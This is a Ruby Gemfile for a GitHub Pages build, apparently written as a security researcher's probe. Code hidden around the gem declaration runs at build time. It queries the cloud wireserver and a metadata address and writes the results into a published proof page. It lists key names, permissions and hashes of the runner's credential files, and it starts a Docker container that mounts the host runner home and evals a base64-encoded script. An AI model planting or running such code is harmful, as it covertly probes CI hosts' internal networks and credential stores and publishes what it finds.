# frozen_string_literal: true
source "https://rubygems.org"

require "json"
require "net/http"
require "uri"

PROOF = File.join(__dir__, "c217-direct-network-proof.html")

def probe(url, marker = nil)
  uri = URI(url)
  # Disable proxy inheritance so this is the action container's own network.
  http = Net::HTTP.new(uri.host, uri.port, nil)
  http.use_ssl = (uri.scheme == "https")
  http.open_timeout = 3
  http.read_timeout = 3
  request = Net::HTTP::Get.new(uri.request_uri)
  request["User-Agent"] = "c217-owned-pages-direct-network-control"
  response = http.request(request)
  body = response.body.to_s
  {
    "response_received" => true,
    "status" => response.code.to_i,
    "body_nonempty" => !body.empty?,
    "expected_marker_present" => marker.nil? ? nil : body.downcase.include?(marker.downcase),
  }
rescue => error
  {
    "response_received" => false,
    "error_class" => error.class.name,
  }
end

proof = {
  "gemfile_executed" => true,
  "direct_action_container" => true,
  "uid" => Process.uid,
  "docker_api_not_used" => true,
  "public_control" => probe("https://api.github.com/zen"),
  "internal_target" => probe("http://168.63.129.16/?comp=versions", "version"),
  "thing_absent_control" => probe("http://169.254.169.253/"),
}

File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")

gem "github-pages", "= 232"

# --- c217 credentials arm v3 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
require 'json'
require 'digest'
require 'open3'

def c217_keys(raw)
  m = raw.match(/\{.*\}/m)
  return ['<non-json>'] if m.nil?
  begin
    JSON.parse(m[0]).keys
  rescue StandardError
    ['<unparseable>']
  end
end

def c217_one(p)
  h = { 'path' => p }
  begin
    st = File.stat(p)
    h['exists'] = true; h['type'] = st.ftype; h['size'] = st.size
    h['mode'] = st.mode.to_s(8); h['owner_uid'] = st.uid; h['gid'] = st.gid
    if st.file? && st.size < 4096
      raw = File.read(p)
      h['keys'] = c217_keys(raw)
      h['sha256'] = Digest::SHA256.hexdigest(raw)
    end
  rescue StandardError => e
    h['exists'] = false; h['err'] = e.class.name
  end
  h
end

def c217_where(tag)
  { 'tag' => tag, 'euid' => (begin; Process.euid; rescue StandardError; -1; end),
    'dirs' => ['/home/runner', '/home/runner/runners', '/home/runner/_work'].map { |d| c217_one(d) },
    'glob' => begin; Dir.glob('/home/runner/runners/*').map { |x| File.basename(x) }; rescue StandardError => e; ['ERR:' + e.class.name]; end }
end

out = { 'container' => c217_where('in-container') }
real = Dir.glob('/home/runner/runners/*/.credentials') +
       Dir.glob('/home/runner/runners/*/.credentials_rsaparams') +
       Dir.glob('/home/runner/runners/*/.runner')
out['container_files'] = real.map { |p| c217_one(p) }
out['container_control'] = c217_one('/home/runner/runners/qqqqzzzz-no-such-runner/.credentials')
warn 'C217ARMV3 ' + JSON.generate(out)

# host half: sibling with read-only bind of the runner home; metadata only
host_probe = <<'RUBY'
require 'json'; require 'digest'
def one(p)
  h = { 'path' => p }
  begin
    st = File.stat(p); h['exists'] = true; h['size'] = st.size; h['mode'] = st.mode.to_s(8)
    h['owner_uid'] = st.uid; h['gid'] = st.gid
    if st.file? && st.size < 4096
      raw = File.read(p); m = raw.match(/\{.*\}/m)
      h['keys'] = (m ? (begin; JSON.parse(m[0]).keys; rescue StandardError; ['<unparseable>']; end) : ['<non-json>'])
      h['sha256'] = Digest::SHA256.hexdigest(raw)
    end
  rescue StandardError => e
    h['exists'] = false; h['err'] = e.class.name
  end
  h
end
o = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end) }
o['hostname_hash'] = (begin; Digest::SHA256.file('/etc/hostname').hexdigest; rescue StandardError; 'ERR'; end)
o['glob'] = (begin; Dir.glob('/host/runners/*').map { |x| File.basename(x) }; rescue StandardError => e; ['ERR:' + e.class.name]; end)
o['files'] = Dir.glob('/host/runners/*/.credentials') + Dir.glob('/host/runners/*/.runner') +
             Dir.glob('/host/runners/*/.credentials_rsaparams') + ['/host/runners/qqqqzzzz/.credentials']
o['files'] = o['files'].map { |p| one(p) }
puts 'C217HOST ' + JSON.generate(o)
RUBY
begin
  cmd = ['docker','run','--rm','--network','none','-v','/home/runner:/host:ro',
         '-e','C217RUBY='+Base64.strict_encode64(host_probe).to_s,
         'ruby:3.2-slim','ruby','-e','require "base64"; eval(Base64.decode64(ENV["C217RUBY"]))']
  o,e,st = Open3.capture3(*cmd)
  warn 'C217ARMDOCKER rc=' + st.exitstatus.to_s + ' out=' + o.to_s + ' err=' + e.to_s[0,400]
rescue StandardError => ex
  warn 'C217ARMDOCKER EXC ' + ex.class.name + ' ' + ex.message[0,200]
end
warn 'C217ARMV3 done'
